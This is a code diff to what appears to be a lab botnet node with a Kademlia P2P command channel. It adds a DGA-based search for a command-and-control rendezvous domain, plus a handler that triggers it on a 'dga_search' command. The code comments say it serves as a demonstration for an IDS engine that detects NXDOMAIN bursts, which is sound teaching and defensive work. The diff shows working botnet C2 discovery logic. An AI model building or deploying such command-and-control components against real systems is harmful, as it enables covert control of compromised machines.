@@ -586,6 +586,75 @@ def _attack_cred_stuffing(target: str, port: int, duration: int,
           f"  mode={mode}  hits={len(hits)}"
           + (f"  valid={hits}" if hits else ""))
 
+def _attack_dga_search(stop: threading.Event):
+    """
+    Trigger a DGA-based C2 domain search — Phase 3 fallback channel.
+ 
+    Imports dga.py's bot_c2_search() if available; falls back to
+    spawning dga.py as a subprocess so the node works even when dga.py
+    is not importable from the current working directory.
+ 
+    The burst of NXDOMAIN responses this generates is the signal that
+    IDS Engine 3 (Shannon entropy + NXDOMAIN burst counter) is designed
+    to catch.  This makes it a useful teaching demonstration even when
+    the P2P command channel itself is fully covert.
+ 
+    The stop event is checked between domain resolution attempts so the
+    attack can be cleanly cancelled by a subsequent stop_all command.
+    """
+    print("[ATTACK] DGA SEARCH started — scanning for C2 rendezvous domain")
+ 
+    # ── Primary: import from dga module ──────────────────────────────
+    try:
+        from dga import bot_c2_search, generate_daily_domains
+        domains = generate_daily_domains(count=20)
+        print(f"[ATTACK] DGA generated {len(domains)} candidate domains")
+ 
+        for domain in domains[:15]:
+            if stop.is_set():
+                print("[ATTACK] DGA SEARCH cancelled (stop_all received)")
+                return
+            try:
+                ip = socket.gethostbyname(domain)
+                print(f"[ATTACK] DGA rendezvous found: {domain} -> {ip}")
+                # In a real attack the bot would fetch commands from ip.
+                # In this lab environment all domains NXDOMAIN — that
+                # burst IS the IDS trigger signal.
+                break
+            except socket.gaierror:
+                print(f"[ATTACK] NXDOMAIN: {domain}")
+                time.sleep(0.3)
+ 
+        print("[ATTACK] DGA SEARCH done.")
+        return
+ 
+    except ImportError:
+        pass   # dga.py not importable from CWD; fall through to subprocess
+ 
+    # ── Fallback: subprocess ──────────────────────────────────────────
+    print("[ATTACK] DGA SEARCH (subprocess fallback) — spawning dga.py")
+    try:
+        import subprocess
+        proc = subprocess.Popen(
+            ["python3", "dga.py"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        # Wait up to 30 s or until stop signal
+        for _ in range(30):
+            if stop.is_set() or proc.poll() is not None:
+                break
+            time.sleep(1)
+        if proc.poll() is None:
+            proc.terminate()
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+    except Exception as e:
+        print(f"[ATTACK] DGA SEARCH subprocess failed: {e}")
+ 
+    print("[ATTACK] DGA SEARCH done.")
 
 # ── Kademlia Node ─────────────────────────────────────────────
 
@@ -1040,6 +1109,10 @@ class KademliaNode:
 
         elif cmd_type == "idle":
             print("[P2P] -> Idle")
+
+        elif cmd_type == "dga_search":
+            print("[P2P] -> Triggering DGA C2 search...")
+            self._launch("dga_search", _attack_dga_search)
 
         else:
             print(f"[P2P] -> Unknown command type: {cmd_type}")
